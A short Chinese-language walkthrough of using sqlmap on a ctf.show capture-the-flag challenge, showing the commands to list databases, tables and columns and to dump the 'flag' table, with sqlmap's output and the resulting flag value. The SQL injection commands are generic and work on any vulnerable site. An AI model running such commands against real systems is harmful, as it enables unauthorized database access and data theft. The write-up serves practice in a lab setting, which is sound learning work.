# sqlmap使用

<br>

* 常用参数
````
常用参数
--dbs 所有数据库
--tables 所有表
--columns 所有列

````

<br>

### 第一步：开始脚本注入

<br>


* 使用sqlmap -u url来进行注入

例：

sqlmap -u "http://d96b8b94-0e30-4e6a-810b-caf654fe2b02.challenge.ctf.show/?id="

<br>

### 第二步：查表

执行上述命令后得到注入成功的回显然后可以进行查库操作

<br>

如上述命令执行后得到

````

available databases [7]:                                                                                                                                                                                    
[*] ctfshow
[*] ctftraining
[*] information_schema
[*] mysql
[*] performance_schema
[*] security
[*] test

````

<br>

* 接下来可以查看指定库的所有表：sqlmap -u "http://d96b8b94-0e30-4e6a-810b-caf654fe2b02.challenge.ctf.show/?id=" -D ctfshow --tables

* 得到回显
````

Database: ctfshow
[1 table]
+------+
| flag |
+------+

````

* 到这里就说明查询到表flag了，接下来使用: sqlmap -u "http://d96b8b94-0e30-4e6a-810b-caf654fe2b02.challenge.ctf.show/?id=" -D ctfshow -T flag --columns

````

Database: ctfshow                                                                                                                                                                                           
Table: flag
[2 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(255) |
| id     | int(11)      |
+--------+--------------+


````

* 接下来使用直接dump出来: sqlmap -u "http://d96b8b94-0e30-4e6a-810b-caf654fe2b02.challenge.ctf.show/?id=" -D ctfshow -T flag --dump

````
Database: ctfshow
Table: flag
[1 entry]
+----+-----------------------------------------------+
| id | flag                                          |
+----+-----------------------------------------------+
| 1  | ctfshow{cd6650cb-4523-49ee-8251-bcbf145e920c} |
+----+-----------------------------------------------+
````